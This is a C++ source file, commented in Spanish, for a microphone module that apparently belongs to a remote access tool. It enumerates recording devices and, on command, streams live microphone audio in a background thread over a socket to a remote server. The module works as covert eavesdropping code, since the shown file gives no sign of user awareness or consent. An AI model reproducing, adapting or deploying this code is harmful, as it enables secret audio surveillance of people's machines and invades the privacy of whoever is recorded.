#include "mod_mic.hpp"

constexpr int NUM_BUFFERS = 2;
constexpr int SAMPLE_RATE = 44100;
constexpr int NUM_CHANNELS = 2;
constexpr int BITS_PER_SAMPLE = 16;
constexpr int BUFFER_SIZE = SAMPLE_RATE * NUM_CHANNELS * BITS_PER_SAMPLE / 8 / 2; // Mitad de un segundo


std::vector<std::string> Mod_Mic::m_ObtenerDispositivos() {
    std::vector<std::string> vcOut;
    for (int i = 0; i < int(waveInGetNumDevs()); i++) {
        WAVEINCAPS wvMic;
        MMRESULT mRes = waveInGetDevCaps(i, &wvMic, sizeof(wvMic));
        if (mRes != MMSYSERR_BADDEVICEID && mRes != MMSYSERR_NOMEM) {
            std::string strDevice = "[";
            strDevice += std::to_string(i);
            strDevice.append(1, ']');
            strDevice += wvMic.szPname;
            vcOut.push_back(strDevice);
        }
    }
    return vcOut;
}

void Mod_Mic::m_Enviar_Dispositivos() {
    std::vector<std::string> vc_devices = this->m_ObtenerDispositivos();
    std::string strSalida = "";

    if (vc_devices.size() > 0) {
        strSalida = std::to_string(EnumComandos::Mic_Refre_Resultado);
        strSalida.append(1, '\\');
        for (auto strDevice : vc_devices) {
            strSalida += strDevice;
            strSalida.append(1, '\\');
        }
        strSalida = strSalida.substr(0, strSalida.size() - 1);
        this->ptr_copy->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
    }
    else {
        strSalida = "No hay dispositivos";
    }

    this->ptr_copy->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
}

void Mod_Mic::m_EmpezarLive() {
    this->isLiveMic = true;

    this->thLiveMic = std::thread(&Mod_Mic::m_LiveMicTh, this);
}

void Mod_Mic::m_DetenerLive() {
    std::unique_lock<std::mutex> lock(this->mic_mutex);
    this->isLiveMic = false;
    lock.unlock();

    if (this->thLiveMic.joinable()) {
        this->thLiveMic.join();
    }
}

void Mod_Mic::m_LiveMicTh() {
#ifdef ___DEBUG_
    std::cout << "[!] thLiveMic iniciada" << std::endl;
#endif //___DEBUG_
    
    // Definir el formato de audio
    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = NUM_CHANNELS;
    wfx.nSamplesPerSec = SAMPLE_RATE;
    wfx.wBitsPerSample = BITS_PER_SAMPLE;
    wfx.nBlockAlign = wfx.wBitsPerSample * wfx.nChannels / 8;
    wfx.nAvgBytesPerSec = wfx.nBlockAlign * wfx.nSamplesPerSec;

    // Abrir el dispositivo de grabación
    
    HWAVEIN wi;
    if (waveInOpen(&wi, this->p_DeviceID, &wfx, (DWORD_PTR)nullptr, (DWORD_PTR)nullptr, CALLBACK_NULL | WAVE_FORMAT_DIRECT) != MMSYSERR_NOERROR) {
#ifdef ___DEBUG_
        std::cout << "Error abriendo " << this->p_DeviceID << " para grabar" << std::endl;
        error();
#endif // ___DEBUG_

        return;
    }

    
  // Crear buffers de audio
    char** buffers = new char*[NUM_BUFFERS];
    WAVEHDR* headers = new WAVEHDR[NUM_BUFFERS];

    for (int i = 0; i < NUM_BUFFERS; ++i) {
        buffers[i] = new char[BUFFER_SIZE];
        //ZeroMemory(buffers[i], BUFFER_SIZE);
        headers[i].lpData = buffers[i];
        headers[i].dwBufferLength = BUFFER_SIZE;
        waveInPrepareHeader(wi, &headers[i], sizeof(headers[i]));
        waveInAddBuffer(wi, &headers[i], sizeof(headers[i]));
    }

    // Iniciar grabación
    if (waveInStart(wi) != MMSYSERR_NOERROR) {
#ifdef ___DEBUG_
        std::cout << "Error abriendo al iniciar la grabacion" << std::endl;
        error();
#endif // ___DEBUG_
        waveInClose(wi);
        return;
    }

    //Real time
    // Bucle principal de captura y envío de audio
    char newBuffer[BUFFER_SIZE + 4];
    while (this->isLiveMic) {
        for (int i = 0; i < NUM_BUFFERS; i++) {
            WAVEHDR& h = headers[i];
            if (h.dwFlags & WHDR_DONE) {
                // Enviar datos de audio al servidor
                memset(newBuffer, 0, sizeof(newBuffer));

                //char* nTest = new char[h.dwBufferLength];
                //std::memcpy(nTest, h.lpData, h.dwBufferLength);

                std::strcpy(newBuffer, std::to_string(EnumComandos::Mic_Live_Packet).c_str()); 
                std::strcpy(newBuffer + 3, "\\");
                std::memcpy(newBuffer + 4, h.lpData, h.dwBufferLength);
                //std::memcpy(newBuffer + 4, nTest, h.dwBufferLength);

                this->ptr_copy->cSend(this->sckSocket, newBuffer, sizeof(newBuffer), 0, false);
                Sleep(10);
                //delete[] nTest;

                h.dwFlags = 0;
                h.dwBytesRecorded = 0;
                waveInPrepareHeader(wi, &h, sizeof(h));
                waveInAddBuffer(wi, &h, sizeof(h));
            }
        }
    }

    // Detener y limpiar la grabación
    waveInStop(wi);
    for (int i = 0; i < NUM_BUFFERS; i++) {
        WAVEHDR& h = headers[i];
        waveInUnprepareHeader(wi, &h, sizeof(h));
    }
    waveInClose(wi);

    delete[] headers;
    for (int i = 0; i < NUM_BUFFERS; i++) {
        delete[] buffers[i];
    }
    delete[] buffers;
#ifdef ___DEBUG_
    std::cout << "[!] thLiveMicTh finalizada" << std::endl;
#endif // ___DEBUG_

}